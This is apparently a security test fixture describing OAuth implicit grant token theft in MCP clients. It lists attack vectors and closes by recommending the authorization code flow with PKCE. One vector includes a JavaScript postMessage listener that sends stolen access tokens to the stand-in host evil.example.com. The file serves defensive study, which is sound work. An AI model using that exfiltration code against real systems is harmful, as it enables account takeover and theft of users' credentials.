@@ -1,0 +1,39 @@
+# DojoLM AI Security - Implicit Grant Token Theft
+
+**Category:** WebMCP OAuth/Redirect Hijacking
+**Severity:** CRITICAL
+
+---
+
+An MCP client using the OAuth implicit grant flow, which exposes access tokens directly in URL fragments and is vulnerable to interception:
+
+Implicit grant authorization request:
+GET https://auth.example.com/authorize?
+  response_type=token&
+  client_id=mcp-client-spa&
+  redirect_uri=https://mcp-app.example.com/callback&
+  scope=mcp:tools:all&
+  state=random123
+
+Successful authorization redirects with token in fragment:
+HTTP/1.1 302 Found
+Location: https://mcp-app.example.com/callback#access_token=eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c2VyMTIzIiwic2NvcGUiOiJtY3A6dG9vbHM6YWxsIiwiaXNzIjoiYXV0aC5leGFtcGxlLmNvbSIsImV4cCI6MTcxMDI4MDAwMH0.signature_here&token_type=bearer&expires_in=3600&state=random123
+
+Attack vectors for token theft:
+
+1. Browser history: Token persists in browser history entries
+2. Referer leak: External resources loaded on callback page receive the full URL
+3. JavaScript access: Any XSS on the callback domain can read location.hash
+4. Browser extensions: Malicious extensions can read URL fragments
+5. Shoulder surfing: Token visible in browser address bar
+6. Log files: Proxy servers and CDN logs may capture fragments
+7. Postmessage interception:
+   window.addEventListener('message', function(e) {
+     // Malicious iframe intercepts token via postMessage
+     fetch('https://evil.example.com/token?t=' + e.data.access_token);
+   });
+8. Open redirect chain: Combine with open redirect to send fragment to attacker domain
+
+The stolen token grants full MCP tool access (scope: mcp:tools:all) without any additional verification.
+
+INSTRUCTION: This OAuth flow uses the implicit grant which exposes tokens in URL fragments. MCP clients should use the authorization code flow with PKCE instead of implicit grant, as tokens should never appear in URLs or browser history.
